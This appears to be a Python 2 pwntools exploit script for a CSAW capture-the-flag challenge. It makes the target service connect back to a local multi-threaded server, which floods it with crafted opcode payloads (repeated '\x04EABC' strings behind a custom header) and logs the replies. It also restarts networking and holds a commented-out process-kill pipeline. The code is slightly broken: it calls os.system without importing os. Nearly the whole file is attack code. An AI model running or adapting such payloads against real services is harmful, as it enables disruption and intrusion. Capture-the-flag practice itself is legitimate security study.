#!/usr/bin/env python
import SocketServer
from pwn import *
from sys import stdin, stdout, argv
from struct import pack
from os import urandom, system
from time import *
THREADS = ord("c") # 99

REMOTE_SERVER = "localhost"
REMOTE_PORT   = 24242


# REMOTE_SERVER = "pwn.chal.csaw.io"
# REMOTE_PORT   = 8004

SOCKET_SERVER = "0.0.0.0"
SOCKET_PORT   = 6000 #int(sys.argv[1])

numThreads = THREADS
thread = 0
# threadList = [None for x in xrange(numThreads)]

# opcodes = [
#     "\x83\x00\x00\xff",
#     "\x84\xff\xff\xff\xfa",
#     "\x84\xff\xff\xff\xfa678",
#     "\x84\x80\x00\x00\x00",
#     "\x84\x83\x82\x81\xff"
# ]

# payloads = [
#     "\x01T",
#     "\x01T"*2,
#     "\x01T",
#     "\x01T"*2,
#     "\x01T",
#     "\x01T"*2,
#     "\x01T",
#     "\x01T"*2,
#     "\x01T"*2,
#     "\x01T"*2,
#     "\x01T"*2,
#     "\x01T",
#     "\x01T"*2,
#     "\x01T",
#     "\x01T"*2,
#     "\x01T",
#     "\x01T"*2,
# ]
payloads = [
    "\x04EABC"*64,
    "\x04EABC",
    "\x04EABC",
    "\x04EABC",
    "\x04EABC"*64,
]


header = lambda c: "\x01\x00"+p16(len(c))+p32(0)


# if special:
#     returnThing += "\x84\xff\xff\xff\xfa678"*CD
#     # returnThing += "\x80"*4
# else:
#     returnThing += "\x84\xff\xff\xff\xf067\x80"*CD
# returnThing += opcodeData
# print returnThing.encode('hex')

# return returnThing

class TCPHandler(SocketServer.BaseRequestHandler):

    def serverResponse(self, response):
        # if "T" in response:
        #     print "yep"

        stdout.write("\033[1;36mServer Said: \033[39m{}\033[0m\n".format(response.encode('hex')))
        stdout.write("\033[1;36mServer Said: \033[39m{}\033[0m\n".format(response))
        stdout.flush()

    def handle(self):
        global thread
        payload = payloads[thread%len(payloads)]
        thread += 1

        # send the header and then wait
        sleep(0.1*thread)
        self.request.sendall(header(payload) + payload)
        recieved = self.request.recv(1024)
        self.serverResponse(recieved)

# Create server and bind
server = SocketServer.ThreadingTCPServer(("0.0.0.0",SOCKET_PORT),TCPHandler)


# Initialise remote client
rmsrv = remote(REMOTE_SERVER, REMOTE_PORT)
clientData = pack("<HH", numThreads, SOCKET_PORT)
rmsrv.sendline(clientData)
rmsrv.close()

server.allow_reuse_address=True

# for x in range(numThreads):
# server.handle_request()
server.serve_forever()

server.server_close()



os.system("/etc/init.d/networking restart")
# os.system("netstat -pant | grep mom | grep 127 | cut -d\   -f 36 | sed 's/\/.*//g' | xargs kill -9")



print 







